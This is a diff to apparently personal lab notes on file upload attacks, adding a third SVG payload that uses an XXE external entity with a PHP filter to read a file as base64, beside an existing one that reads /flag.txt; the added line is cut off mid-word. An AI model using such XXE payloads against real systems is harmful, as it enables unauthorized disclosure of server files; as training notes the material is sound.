@@ -59,6 +59,13 @@ shell2.svg
 <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
 <svg>&xxe;</svg>
 ```
+shell3.svg
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc>
+<svg>&xxe;</svg>
+```
+
 ## Skills Assessment - File Upload Attacks
 
 shell.svg
